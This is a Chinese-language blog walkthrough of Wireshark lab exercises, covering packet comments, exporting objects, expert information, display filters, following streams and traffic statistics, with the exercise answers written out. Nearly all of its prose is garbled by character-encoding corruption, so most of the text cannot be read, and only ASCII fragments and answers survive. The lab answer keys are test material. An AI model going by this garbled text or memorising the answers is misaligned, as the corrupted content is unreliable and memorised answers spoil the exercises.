<p>ä¸æ°æ®åæ è®°ç±»ä¼¼ï¼æ³¨éæ¯åæäººåçå¦ä¸é¡¹å®ç¨åè½ãæ¨å¯ä»¥ä¸ºç¹å®æ°æ®åæ·»å æ³¨éï¼ä»¥å¸®å©è¿ä¸æ­¥è°æ¥ï¼ææéå¶ä»å±åæäººåæ³¨æéè¦/å¯çä¹å¤ãä¸æ°æ®åæ è®°ä¸åçæ¯ï¼æ³¨éä¼ä¸ç´ä¿çå¨æè·æä»¶ä¸­ï¼ç´å°æä½åå°å¶å é¤ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/062d5414bf0eb8d6ba20129d3a599584.gif" alt="" loading="lazy"></p>
<h5 id="å¯¼åºæ°æ®å">å¯¼åºæ°æ®å</h5>
<p>æè·æä»¶å¯è½åå«æ°åä¸ªæ°æ®åãå¦åæè¿°ï¼Wireshark å¹¶éå¥ä¾µæ£æµç³»ç» (IDS)ï¼å æ­¤ææ¶éè¦ä»æä»¶ä¸­æåç¹å®æ°æ®åå¹¶è¿è¡æ·±å¥åæä»¥è§£å³å®å¨äºä»¶ãæ­¤åè½æå©äºåæäººåä»å±äº«å¯çæ°æ®åï¼å·²ç¡®å®èå´ï¼ãè¿æ ·ï¼åä½ä¿¡æ¯å°±ä¸ä¼è¢«çº³å¥åæè¿ç¨ãæ¨å¯ä»¥ä½¿ç¨ <strong>âæä»¶â</strong> èåå¯¼åºæ°æ®åã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/678da29ee744fb81f262cd9a1973adfa.gif" alt="" loading="lazy"></p>
<h5 id="å¯¼åºå¯¹è±¡æä»¶">å¯¼åºå¯¹è±¡ï¼æä»¶ï¼</h5>
<p>Wireshark å¯ä»¥æåéè¿ç½ç»ä¼ è¾çæä»¶ãå¯¹äºå®å¨åæå¸èè¨ï¼åç°å±äº«æä»¶å¹¶å°å¶ä¿å­ä»¥ä¾è¿ä¸æ­¥è°æ¥è³å³éè¦ãå¯¼åºå¯¹è±¡åè½ä»éç¨äºç¹å®åè®®æµï¼DICOMãHTTPãIMFãSMBå TFTPï¼ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/d05524de7fed4d4f416fee5c55f05de3.gif" alt="" loading="lazy"></p>
<h5 id="æ¶é´æ¾ç¤ºæ ¼å¼">æ¶é´æ¾ç¤ºæ ¼å¼</h5>
<p>Wireshark ä¼ååºæè·å°çæ°æ®åï¼å æ­¤åæé»è®¤æµå¹¶éæ»æ¯æä½³éæ©ãé»è®¤æåµä¸ï¼Wireshark ä»¥âèªæè·å¼å§ä»¥æ¥çç§æ°âæ¾ç¤ºæ¶é´ï¼éå¸¸ä½¿ç¨UTCæ¶é´æ¾ç¤ºæ ¼å¼ä»¥è·å¾æ´ä½³çè§å¾ãæ¨å¯ä»¥ä½¿ç¨ <strong>âè§å¾ --&gt; æ¶é´æ¾ç¤ºæ ¼å¼â</strong> èåæ´æ¹æ¶é´æ¾ç¤ºæ ¼å¼ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/2e5d906bef2522715d1a746f47042213.gif" alt="" loading="lazy"><br>
<img src="https://i-blog.csdnimg.cn/img_convert/67c976a97883c1b507a6c0a85758cdf9.png" alt="" loading="lazy"></p>
<h5 id="ä¸å®¶ä¿¡æ¯">ä¸å®¶ä¿¡æ¯</h5>
<p>Wireshark è¿è½æ£æµåè®®çç¹å®ç¶æï¼å¸®å©åæäººåè½»æ¾åç°æ½å¨çå¼å¸¸åé®é¢ãè¯·æ³¨æï¼è¿äºåªæ¯å»ºè®®ï¼å§ç»å­å¨è¯¯æ¥/æ¼æ¥çå¯è½æ§ãä¸å®¶ä¿¡æ¯å¯ä»¥æä¾ä¸ä¸ªä¸åä¸¥éç¨åº¦çç±»å«ãè¯¦æè§ä¸è¡¨ã</p>
<table>
<thead>
<tr>
<th><strong>ä¸¥éç¨åº¦</strong></th>
<th><strong>é¢è²</strong></th>
<th><strong>ä¿¡æ¯</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>èå¤©</strong></td>
<td><strong>èè²ç</strong></td>
<td>å¸¸è§å·¥ä½æµç¨ä¿¡æ¯ã</td>
</tr>
<tr>
<td><strong>ç¬è®°</strong></td>
<td><strong>éè²</strong></td>
<td>å¼å¾æ³¨æçäºä»¶ï¼ä¾å¦åºç¨ç¨åºéè¯¯ä»£ç ã</td>
</tr>
<tr>
<td><strong>è­¦å</strong></td>
<td><strong>é»è²ç</strong></td>
<td>è­¦åä¿¡æ¯ï¼ä¾å¦å¼å¸¸éè¯¯ä»£ç æé®é¢æè¿°ã</td>
</tr>
<tr>
<td><strong>éè¯¯</strong></td>
<td><strong>çº¢è²ç</strong></td>
<td>ä¾å¦æ°æ®åæ ¼å¼éè¯¯ä¹ç±»çé®é¢ã</td>
</tr>
</tbody>
</table>
<p>ä¸è¡¨ååºäºå¸¸ç¨ä¿¡æ¯ç»ãæå³ä¸å®¶ä¿¡æ¯æ¡ç®çæ´å¤ä¿¡æ¯ï¼è¯·åé<a href="https://www.wireshark.org/docs/" target="_blank" rel="noopener nofollow">Wireshark çå®æ¹ææ¡£ã</a></p>
<table>
<thead>
<tr>
<th><strong>å¢ä½</strong></th>
<th><strong>ä¿¡æ¯</strong></th>
<th><strong>å¢ä½</strong></th>
<th><strong>ä¿¡æ¯</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>æ ¡éªå</strong></td>
<td>æ ¡éªåéè¯¯</td>
<td><strong>å·²å¼ç¨</strong></td>
<td>å·²å¼ç¨çåè®®ç¨æ³</td>
</tr>
<tr>
<td><strong>è¯è®º</strong></td>
<td>æ°æ®åæ³¨éæ£æµ</td>
<td><strong>ç¸å½¢</strong></td>
<td>ç¸å½¢æ°æ®åæ£æµ</td>
</tr>
</tbody>
</table>
<p>æ¨å¯ä»¥ä½¿ç¨ç¶ææ  <strong>å·¦ä¸è§åºåæâåæ --&gt; ä¸å®¶ä¿¡æ¯â</strong> èåï¼éè¿å¯¹è¯æ¡æ¥çææå¯ç¨ä¿¡æ¯æ¡ç®ãå®ä¼æ¾ç¤ºæ°æ®åç¼å·ãæè¦ãç»åè®®åæ»åçæ¬¡æ°ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/45cff1956ab1c83ded7cce0ef586a555.png" alt="" loading="lazy"></p>
<hr>
<p>è¯·åç­ä»¥ä¸é®é¢ã</p>
<p>è¯·ä½¿ç¨âExercise.pcapngâæä»¶åç­é®é¢ãå¨æ°æ®åè¯¦æä¸­æç´¢<strong>å­ç¬¦ä¸²âr4wâ</strong>ãèºæ¯å®¶1çåå­æ¯ä»ä¹ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/fcb061e4b3eb4b3d5e80fe810d8e4a85.png" alt="500" loading="lazy"></p>
<pre><code class="language-python">r4w8173
</code></pre>
<p><strong>è½¬å°ç¬¬ 12 ä¸ªæ°æ®å</strong>å¹¶éè¯»æ°æ®åæ³¨éãç­æ¡æ¯ä»ä¹ï¼<br>
æ³¨æï¼ä½¿ç¨ ç»ç«¯å½ä»¤ <strong><code>md5sum &lt;æä»¶å&gt;</code></strong> è·å MD5 åå¸å¼ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/5c5d5802f76131254e0b4dfa9b034b0a.png" alt="" loading="lazy"><br>
å¯¼åºè¿ä¸ªç§ç<br>
<img src="https://i-blog.csdnimg.cn/img_convert/b765b4e1398931c30e3323e8a48bd12b.png" alt="" loading="lazy"><br>
è®¡ç®md5<br>
<img src="https://i-blog.csdnimg.cn/img_convert/25c5be1864a838b19043d27461c3e1c8.png" alt="" loading="lazy"></p>
<pre><code class="language-python">911cd574a42865a956ccde2d04495ebf
</code></pre>
<p>æè·æä»¶ä¸­åå«ä¸ä¸ª <strong>â.txtâ</strong> æä»¶ãæ¾å°è¯¥æä»¶å¹¶éè¯»ï¼å¤æäººçåå­æ¯ä»ä¹ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/26381ed1d8ef57bd65e6b75f9926dd58.png" alt="" loading="lazy"><br>
åçä¿å­è¯¥æä»¶ï¼ç¶åæä»¬catä¸ä¸<br>
<img src="https://i-blog.csdnimg.cn/img_convert/f35a3ad2ef348b778965e911fe5c700b.png" alt="" loading="lazy"></p>
<pre><code class="language-python">packetmaster
</code></pre>
<p>è¯·æ¥çä¸å®¶ä¿¡æ¯é¨åãè­¦åæ°éæ¯å¤å°ï¼<br>
Go to Analyze&gt;Expert Information<br>
é»è²æ¯åè­¦<br>
<img src="https://i-blog.csdnimg.cn/img_convert/f336b19c3a5ba364b64228751b012c19.png" alt="" loading="lazy"></p>
<h4 id="æ°æ®åè¿æ»¤">æ°æ®åè¿æ»¤</h4>
<h5 id="æ°æ®åè¿æ»¤-1">æ°æ®åè¿æ»¤</h5>
<p>Wireshark æ¥æå¼ºå¤§çè¿æ»¤å¼æï¼å¯ä»¥å¸®å©åæäººåç¼©å°æµéèå´ï¼ä¸æ³¨äºæå´è¶£çäºä»¶ãWireshark æä¾ä¸¤ç§è¿æ»¤æ¹å¼ï¼æè·è¿æ»¤å¨åæ¾ç¤ºè¿æ»¤å¨ãæè·è¿æ»¤å¨ç¨äº <strong>âæè·â</strong> ç¬¦åæå®è¿æ»¤å¨æ¡ä»¶çæ°æ®åãæ¾ç¤ºè¿æ»¤å¨ç¨äº <strong>âæ¥çâ</strong> ç¬¦åæå®è¿æ»¤å¨æ¡ä»¶çæ°æ®åãæä»¬å°å¨ä¸ä¸èè¯¾è®¨è®ºè¿äºè¿æ»¤å¨çåºå«åé«çº§ç¨æ³ãç°å¨ï¼è®©æä»¬éç¹ä»ç»æ¾ç¤ºè¿æ»¤å¨çåºæ¬ç¨æ³ï¼è¿å°å¯¹åæäººåçå·¥ä½å¤§æè£¨çã</p>
<p>è¿æ»¤å¨æ¯ä¸ä¸º Wireshark å®æ¹åè®®åèä¸­æä¾çåè®®èè®¾è®¡çç¹å®æ¥è¯¢ãè½ç¶è¿æ»¤å¨åªæ¯ç¨äºè°æ¥æå´è¶£äºä»¶çä¸ç§æ¹å¼ï¼ä½æä¸¤ç§ä¸åçæ¹æ³å¯ä»¥è¿æ»¤æµéå¹¶ä»æè·æä»¶ä¸­å»é¤åªå£°ãç¬¬ä¸ç§æ¹æ³æ¯ä½¿ç¨æ¥è¯¢ï¼ç¬¬äºç§æ¹æ³æ¯ä½¿ç¨å³é®èåãWireshark æä¾äºä¸ä¸ªå¼ºå¤§çå¾å½¢ç¨æ·çé¢(GUI)ï¼å¯¹äºä¸æ³ä¸ºåºæ¬ä»»å¡ç¼åæ¥è¯¢çåæäººåæ¥è¯´ï¼æä¸æ¡é»éæ³åï¼ <strong>âåªè¦ä½ è½ç¹å»å®ï¼ä½ å°±è½è¿æ»¤åå¤å¶å®ãâ</strong></p>
<h5 id="åºç¨ä¸ºç­éå¨">åºç¨ä¸ºç­éå¨</h5>
<p>è¿æ¯è¿æ»¤æµéæåºæ¬çæ¹æ³ãå¨åææè·æä»¶æ¶ï¼æ¨å¯ä»¥ç¹å»æ³è¦è¿æ»¤çå­æ®µï¼ç¶åä½¿ç¨âå³é®èåâæ <strong>âåæ</strong> <strong>--&gt; åºç¨ä¸ºè¿æ»¤å¨â</strong> èåæ¥è¿æ»¤ç¹å®å¼ãåºç¨è¿æ»¤å¨åï¼Wireshark å°çææéçè¿æ»¤æ¥è¯¢å¹¶åºç¨ï¼æ ¹æ®æ¨çéæ©æ¾ç¤ºæ°æ®åï¼å¹¶å°æªéæ©çæ°æ®åä»æ°æ®ååè¡¨çªæ ¼ä¸­éèãè¯·æ³¨æï¼ç¶ææ å§ç»ä¼æ¾ç¤ºæ°æ®åæ»æ°åå·²æ¾ç¤ºæ°æ®åçæ°éã<br>
ç®åæ¥è¯´å°±æ¯æ ¹æ®å¯¹åºçå­æ®µ<br>
<img src="https://i-blog.csdnimg.cn/img_convert/45eae3aa1d34c32a5987d61e64cb2f0e.png" alt="" loading="lazy"></p>
<h5 id="å¯¹è¯è¿æ»¤å¨">å¯¹è¯è¿æ»¤å¨</h5>
<p>ä½¿ç¨âåºç¨ä¸ºè¿æ»¤å¨âéé¡¹æ¶ï¼æ¨åªä¼è¿æ»¤æ°æ®åä¸­çåä¸ªå®ä½ãæ­¤éé¡¹éå¸¸éåæ¥æ¾æ°æ®åä¸­çç¹å®å¼ãä½æ¯ï¼åè®¾æ¨æ³è¦éè¿å³æ³¨ IP å°ååç«¯å£å·æ¥æ¥æ¾ç¹å®æ°æ®åç¼å·åå¶ææå³èæ°æ®åï¼é£ä¹âä¼è¯è¿æ»¤å¨âéé¡¹å¯ä»¥å¸®å©æ¨è½»æ¾æ¥çç¸å³æ°æ®åå¹¶éèå¶ä½æ°æ®åãæ¨å¯ä»¥ä½¿ç¨âå³é®åå»èåâæâ<strong>åæ --&gt; ä¼è¯è¿æ»¤å¨</strong>âèåæ¥è¿æ»¤ä¼è¯ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/1d3e1f3d4f69c2feeb8f1aac065b9aec.png" alt="" loading="lazy"></p>
<h5 id="ä¸ºå¯¹è¯çè²">ä¸ºå¯¹è¯çè²</h5>
<p>æ­¤éé¡¹ä¸âä¼è¯è¿æ»¤å¨âç±»ä¼¼ï¼ä½æä¸ç¹ä¸åãå®ä¼é«äº®æ¾ç¤ºå·²é¾æ¥çæ°æ®åï¼èä¸ä¼åºç¨æ¾ç¤ºè¿æ»¤å¨æåå°å·²æ¥ççæ°æ®åæ°éãæ­¤éé¡¹ä¸âçè²è§åâéé¡¹éåä½¿ç¨ï¼ä¼å¨ä¸èèåååºç¨çé¢è²è§åçæåµä¸æ´æ¹æ°æ®åé¢è²ãæ¨å¯ä»¥ä½¿ç¨âå³é®åå»èåâæ <strong>âè§å¾ --&gt; ä¸ºä¼è¯çè²â</strong> èåï¼ä¸é®ä¸ºå·²é¾æ¥çæ°æ®åçè²ãè¯·æ³¨æï¼æ¨å¯ä»¥ä½¿ç¨ <strong>âè§å¾ --&gt; ä¸ºä¼è¯çè² --&gt; éç½®çè²â</strong> èåæ¤éæ­¤æä½ã<br>
å°±æ¯å¯ä»¥ä¸ºä½ è¿ä¸ªä¼è¯è¿è¡é¢è²æ è®°ï¼è®©ä½ æ´å®¹æçæ¸æ¥ï¼è¿ä¸ªå°±æ¯ä½ è·è¸ªtcpæèhttpæµéä¸æ ·ï¼ææ¯ä¸ä¸ªåé½çè²æ è®°åºæ¥è®©ä½ è¯å«ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/3242945189e93033f1b7c8c68caadba8.png" alt="" loading="lazy"><br>
<img src="https://i-blog.csdnimg.cn/img_convert/8c799c256e2086d8c47b1380e6a631c6.png" alt="" loading="lazy"></p>
<h5 id="åå¤ä½ä¸ºè¿æ»¤å¨">åå¤ä½ä¸ºè¿æ»¤å¨</h5>
<p>ä¸âåºç¨ä¸ºç­éå¨âç±»ä¼¼ï¼æ­¤éé¡¹å¯å¸®å©åæäººåä½¿ç¨âå³é®åå»âèåéæ©ï¼<code>åå¤ä½ä¸ºè¿æ»¤å¨</code>ãä½æ¯ï¼ä¸åèä¸åçæ¯ï¼æ­¤æ¨¡åä¸ä¼å¨éæ©åç«å³åºç¨ç­éå¨ãå®ä¼å°æéçæ¥è¯¢æ·»å å°çªæ ¼ä¸­ï¼æ­£å¦ä¸å¾æç¤ºï¼ä½ ä¼çå°å·²ç»æ·»å äºä¸ä¸ªç­éè§åä¸å»ï¼ä½æ¯è¿æ²¡åºç¨èå·²ï¼éè¦ä½ ç¡®å®æèæ·»å æ´å¤ç­éè§åè¿å»<br>
<img src="https://i-blog.csdnimg.cn/img_convert/1f3cdbdadfeab5bb927997d6c1d9f363.png" alt="500" loading="lazy"><br>
<img src="https://i-blog.csdnimg.cn/img_convert/300739d60e0524878e0893ea2ba8fa40.png" alt="500" loading="lazy"></p>
<h5 id="ä½ä¸ºååºç¨">ä½ä¸ºååºç¨</h5>
<p>é»è®¤æåµä¸ï¼æ°æ®ååè¡¨çªæ ¼æä¾æ¯ä¸ªæ°æ®åçåºæ¬ä¿¡æ¯ãæ¨å¯ä»¥ä½¿ç¨âå³é®åå»èåâæâ<strong>åæ --&gt; åºç¨ä¸ºå</strong>âèååæ°æ®ååè¡¨çªæ ¼æ·»å åãåå»æä¸ªå¼å¹¶å°å¶åºç¨ä¸ºååï¼è¯¥åå°æ¾ç¤ºå¨æ°æ®ååè¡¨çªæ ¼ä¸­ãæ­¤åè½æå©äºåæäººåæ£æ¥æè·æä»¶ä¸­å¯ç¨æ°æ®åä¸­ç¹å®å¼/å­æ®µçåºç°æåµãæ¨å¯ä»¥éè¿åå»æ°æ®ååè¡¨çªæ ¼é¡¶é¨æ¥å¯ç¨/ç¦ç¨å¶ä¸­æ¾ç¤ºçåã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/341b3ffb46c3d1bcff2aecd74b8f204f.png" alt="500" loading="lazy"><br>
<img src="https://i-blog.csdnimg.cn/img_convert/d2adff1b3d8331112e608b33a26b63db.png" alt="500" loading="lazy"></p>
<h5 id="è·è¸ªæµ">è·è¸ªæµ</h5>
<p>Wireshark ä»¥æ°æ®åå¤§å°çå½¢å¼æ¾ç¤ºææåå®¹ãç¶èï¼å¯ä»¥éææ°æ®æµï¼å¹¶æ¥çåºç¨å±åç°çåå§æµéãéµå¾ªåè®®ï¼æ°æ®æµæå©äºåæäººåéç°åºç¨å±æ°æ®ï¼å¹¶äºè§£æå´è¶£çäºä»¶ãæ­¤å¤ï¼è¿å¯ä»¥æ¥çæªå å¯çåè®®æ°æ®ï¼ä¾å¦ç¨æ·åãå¯ç åå¶ä»ä¼ è¾çæ°æ®ã</p>
<p>æ¨å¯ä»¥ä½¿ç¨âå³é®èåâæ <strong>âåæ</strong> <strong>--&gt; è·è¸ªTCP / UDP / HTTPæµâ</strong> èåæ¥è·è¸ªæµéãæµéä¼æ¾ç¤ºå¨åç¬çå¯¹è¯æ¡ä¸­ï¼æ¥èªæå¡å¨çæ°æ®åä»¥èè²é«äº®æ¾ç¤ºï¼æ¥èªå®¢æ·ç«¯çæ°æ®åä»¥çº¢è²é«äº®æ¾ç¤ºã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/6a9e6e2bfead968df5357cda094b2dd4.png" alt="500" loading="lazy"><br>
è·è¸ªæä¸ªæ°æ®æµåï¼Wireshark ä¼èªå¨åå»ºå¹¶åºç¨æéçè¿æ»¤å¨æ¥æ¥çè¯¥æ°æ®æµãè¯·æ³¨æï¼åºç¨è¿æ»¤å¨åï¼æ¾ç¤ºçåæ°éä¼åçååãæ¨éè¦ä½¿ç¨ä½äºæ¾ç¤ºè¿æ»¤å¨æ å³ä¸è§ç â <strong>X â</strong> <strong>æé®æ¥ç§»é¤æ¾ç¤ºè¿æ»¤å¨ï¼å¹¶æ¥çæè·æä»¶ä¸­ææå¯ç¨çåã</strong></p>
<hr>
<p>è¯·åç­ä»¥ä¸é®é¢ã</p>
<p>è¯·ä½¿ç¨â <strong>Exercise.pcapng</strong> âæä»¶åç­é®é¢ã<br>
è½¬å°ç¬¬<strong>4ä¸ª</strong>æ°æ®åãå³é®åå»âè¶ææ¬ä¼ è¾ââåè®®âï¼å¹¶å°å¶åºç¨ä¸ºç­éå¨ã<br>
ç°å¨ï¼æ¥çç­éå¨çªæ ¼ãç­éæ¥è¯¢æ¯ä»ä¹ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/80f3fbf1fdc1ace874675cd1626099dd.png" alt="500" loading="lazy"></p>
<pre><code class="language-python">http
</code></pre>
<p>æ¾ç¤ºçåæ°éæ¯å¤å°ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/da3838f33aa693e3e04be02b5a7dc4ee.png" alt="500" loading="lazy"></p>
<pre><code class="language-python">1089
</code></pre>
<p>æ¾å°æ°æ®åç¼å·<strong>33790</strong> ï¼ è·è¸ª HTTP æµï¼ä»ç»æ¥çååºã<br>
æ ¹æ® Web æå¡å¨çååºï¼èºæ¯å®¶æ»æ°æ¯å¤å°ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/92e8ab25df209623da5dce200e5dd2c0.png" alt="500" loading="lazy"></p>
<pre><code class="language-python">3
</code></pre>
<p>ç¬¬äºä½èºæ¯å®¶çåå­æ¯ä»ä¹ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/6a6b61bffcf7729756b95f0057f414b1.png" alt="500" loading="lazy"></p>
<pre><code class="language-python">Blad3
</code></pre>
<h3 id="wiresharkæ°æ®åæä½">Wiresharkï¼æ°æ®åæä½</h3>
<h4 id="ä»ç»-2">ä»ç»</h4>
<p>å¨æ¬æ¿é´ä¸­ï¼æä»¬å°ä»ç»ä½¿ç¨ Wireshark è¿è¡æ°æ®ååæçåºç¡ç¥è¯ï¼å¹¶ä»æ°æ®åçº§å«åææå´è¶£çäºä»¶ã</p>
<ul>
<li>å­¦ä¹ ç®æ 
<ul>
<li>è°æ¥ç½ç»æµéæè·</li>
<li>æ¥çç»è®¡æ°æ®ï¼åæ¬æè¦åæ¹æ¡è¯¦æ</li>
<li>æ­ç¤ºå¹¶åºç¨æ°æ®åè¿æ»¤åç</li>
<li>åºç¨åè®®è¿æ»¤å¨</li>
<li>åºç¨é«çº§ç­é</li>
</ul>
</li>
</ul>
<h4 id="ç»è®¡æ°æ®--æè¦">ç»è®¡æ°æ® | æè¦</h4>
<h5 id="ç»è®¡æ°æ®">ç»è®¡æ°æ®</h5>
<p>æ­¤èåæä¾å¤ç§ç»è®¡éé¡¹ï¼æ¹ä¾¿ç¨æ·è¿è¡åæï¼ä»èäºè§£æµéèå´ãå¯ç¨åè®®ãç«¯ç¹åä¼è¯ç­æ´ä½æåµï¼ä»¥åä¸äºåè®®ç¹å®ç»èï¼ä¾å¦DHCPãDNSåHTTP /2ãå¯¹äºå®å¨åæå¸èè¨ï¼äºè§£å¦ä½å©ç¨è¿äºç»è®¡ä¿¡æ¯è³å³éè¦ãæ¬é¨åæä¾å·²å¤çpcapæä»¶çç®è¦æ¦è¿°ï¼å¸®å©åæå¸ä¸ºè°æ¥å»ºç«åè®¾ãæ¨å¯ä»¥ä½¿ç¨  <strong>âç»è®¡â</strong> èåæ¥çææå¯ç¨éé¡¹ãç°å¨å¯å¨æå®çèææºï¼æå¼ Wiresharkï¼å è½½âExercise.pcappngâæä»¶ï¼å¹¶æç§æ­¥éª¤è¿è¡æä½ã</p>
<h5 id="å·²è§£æå°å">å·²è§£æå°å</h5>
<p>æ­¤éé¡¹éè¿æä¾å·²è§£æå°ååå¶ä¸»æºåçåè¡¨ï¼å¸®å©åæäººåè¯å«æè·æä»¶ä¸­å¯ç¨ç IP å°ååDNSåç§°ãè¯·æ³¨æï¼ä¸»æºåä¿¡æ¯åèªæè·æä»¶ä¸­çDNSåºç­ãåæäººåå¯ä»¥ä½¿ç¨æ­¤èåå¿«éè¯å«å·²è®¿é®çèµæºãå æ­¤ï¼ä»ä»¬å¯ä»¥å¿«éåç°å·²è®¿é®çèµæºï¼å¹¶æ ¹æ®æå´è¶£çäºä»¶å¯¹å¶è¿è¡è¯ä¼°ãæ¨å¯ä»¥ä½¿ç¨  <strong>âç»è®¡ä¿¡æ¯ --&gt; å·²è§£æå°åâ</strong> èåæ¥ç Wireshark è§£æçææå°åã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/c2af834e0c4fd1681e92be3884a70ede.png" alt="" loading="lazy"></p>
<h5 id="åè®®å±æ¬¡ç»æ">åè®®å±æ¬¡ç»æ</h5>
<p>æ­¤éé¡¹ä¼å°æè·æä»¶ä¸­ææå¯ç¨åè®®è¿è¡ç»åï¼å¹¶å¸®å©åæäººåæ ¹æ®æ°æ®åè®¡æ°å¨åç¾åæ¯ä»¥æ ç¶è§å¾æ¥çè¿äºåè®®ãå æ­¤ï¼åæäººåå¯ä»¥æ¥çç«¯å£åæå¡çæ»ä½ä½¿ç¨æåµï¼å¹¶ä¸æ³¨äºæå´è¶£çäºä»¶ãä¸ä¸èä¸­æå°çé»éæ³åå¨æ¬èä¸­åæ ·éç¨ï¼æ¨å¯ä»¥å³é®åå»å¹¶ç­éæå´è¶£çäºä»¶ãæ¨å¯ä»¥ä½¿ç¨ <strong>âç»è®¡ä¿¡æ¯ --&gt; åè®®å±æ¬¡ç»æâã</strong></p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/0b041bc45140f75ae3642f0555c7ed5f.png" alt="" loading="lazy"></p>
<h5 id="ä¼è¯">ä¼è¯</h5>
<p>ä¼è¯ä»£è¡¨ä¸¤ä¸ªç¹å®ç«¯ç¹ä¹é´çéä¿¡æµéãæ­¤éé¡¹ä»¥äºç§åºæ¬æ ¼å¼ï¼ä»¥å¤ªç½ãIPv4ãIPv6ã TCPåUDPï¼ååºä¼è¯ãå æ­¤ï¼åæäººåå¯ä»¥è¯å«ææä¼è¯å¹¶èç³»æå´è¶£çäºä»¶çç«¯ç¹ãæ¨å¯ä»¥ä½¿ç¨âç»è®¡ä¿¡æ¯ --&gt; ä¼è¯âèåæ¥çæ­¤ä¿¡æ¯ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/fe435a74166b71fc0c7a823df5e42a39.png" alt="" loading="lazy"></p>
<h5 id="ç»ç¹">ç»ç¹</h5>
<p>âç«¯ç¹âéé¡¹ä¸âä¼è¯âéé¡¹ç±»ä¼¼ãå¯ä¸çåºå«å¨äºï¼æ­¤éé¡¹éå¯¹åä¸ªä¿¡æ¯å­æ®µï¼ä»¥å¤ªç½ãIPv4ãIPv6ãTCPåUDPï¼æä¾å¯ä¸ä¿¡æ¯ãå æ­¤ï¼åæäººåå¯ä»¥è¯å«æè·æä»¶ä¸­çå¯ä¸ç«¯ç¹ï¼å¹¶å°å¶ç¨äºæå´è¶£çäºä»¶ãæ¨å¯ä»¥ä½¿ç¨âç»è®¡ä¿¡æ¯ --&gt; ç«¯ç¹âèåæ¥çæ­¤ä¿¡æ¯ã</p>
<p>Wireshark è¿æ¯æä½¿ç¨ IEEE åéçå¶é ååç§°å° MAC å°åè§£æä¸ºäººç±»å¯è¯»çæ ¼å¼ãè¯·æ³¨æï¼æ­¤è½¬æ¢ä»ä½¿ç¨ MAC å°åçåä¸ä¸ªå­èï¼å¹¶ä¸ä»éç¨äºå·²ç¥çå¶é åãå¨æ¥çä»¥å¤ªç½ç«¯ç¹æ¶ï¼æ¨å¯ä»¥éè¿ç«¯ç¹çªå£å·¦ä¸è§ç <strong>âåç§°è§£æâæé®å¯ç¨æ­¤éé¡¹ã</strong><br>
<img src="https://i-blog.csdnimg.cn/img_convert/e402a958abc8aef18965e8da85addded.png" alt="" loading="lazy"></p>
<p>åç§°è§£æä¸ä»éäº MAC å°åãWireshark ä¹æä¾ IP å°ååç«¯å£åç§°è§£æéé¡¹ãä½æ¯ï¼è¿äºéé¡¹é»è®¤æåµä¸æªå¯ç¨ãå¦ææ¨æ³ä½¿ç¨è¿äºåè½ï¼éè¦éè¿ <strong>âç¼è¾ --&gt; é¦éé¡¹ --&gt; åç§°è§£æâ</strong> èåå°å¶æ¿æ´»ãå¯ç¨ IP å°ååç«¯å£åç§°è§£æåï¼æ¨å°å¨æ°æ®ååè¡¨çªæ ¼ä¸­çå°è§£æåç IP å°ååç«¯å£åç§°ï¼ä¹å¯ä»¥å¨âä¼è¯âåâç«¯ç¹âèåä¸­æ¥çè§£æåçåç§°ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/2a4919ff9a8662f23feed14cf5142f3f.png" alt="" loading="lazy"><br>
å¸¦æåç§°è§£æçç«¯ç¹èåè§å¾ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/f6929a762ee5f3943388c38fb3d18289.png" alt="" loading="lazy"><br>
é¤äºåç§°è§£æä¹å¤ï¼Wireshark è¿æä¾ IP å°çä½ç½®æ å°åè½ï¼å¸®å©åæäººåè¯å«å°å¾çæºå°ååç®æ å°åãä½æ­¤åè½é»è®¤æåµä¸æªå¯ç¨ï¼éè¦ GeoIP æ°æ®åºç­è¡¥åæ°æ®ãç®åï¼Wireshark æ¯æ MaxMind æ°æ®åºï¼ææ°çæ¬ç Wireshark å·²é¢è£ MaxMind æ°æ®åºè§£æå¨ãä¸è¿ï¼æ¨ä»ç¶éè¦ MaxMind æ°æ®åºæä»¶ï¼å¹¶éè¿âç¼è¾ --&gt; é¦éé¡¹ --&gt; åç§°è§£æ --&gt; MaxMind æ°æ®åºç®å½âèåå Wireshark æä¾æ°æ®åºè·¯å¾ãä¸è½½å¹¶æå®è·¯å¾åï¼Wireshark å°èªå¨å¨ IP åè®®è¯¦ç»ä¿¡æ¯ä¸æä¾å¹é IP å°åç GeoIP ä¿¡æ¯ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/c31531988a1ede5a3eb588aa5ce4a746.png" alt="" loading="lazy"><br>
ç«¯ç¹å GeoIP è§å¾ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/0ee77ac4d9640fce5b8308d3f2cf297e.png" alt="" loading="lazy"><br>
<strong>æ³¨æï¼æ¨éè¦è¿æ¥äºèç½æè½æ¥ç GeoIP å°å¾ã</strong></p>
<hr>
<p>è¯·åç­ä»¥ä¸é®é¢</p>
<p>è°æ¥å·²è§£æçå°åãä¸»æºåä»¥âbbcâå¼å¤´çIPå°åæ¯ä»ä¹ï¼<br>
ç»è®¡-&gt;å°åè§£æï¼æç´¢bbcå³å¯<br>
<img src="https://i-blog.csdnimg.cn/img_convert/b755360dd748a7f3a8264be18cdfffda.png" alt="400" loading="lazy"></p>
<pre><code class="language-python">199.232.24.81
</code></pre>
<p>IPv4 ä¼è¯æ°æ¯å¤å°ï¼<br>
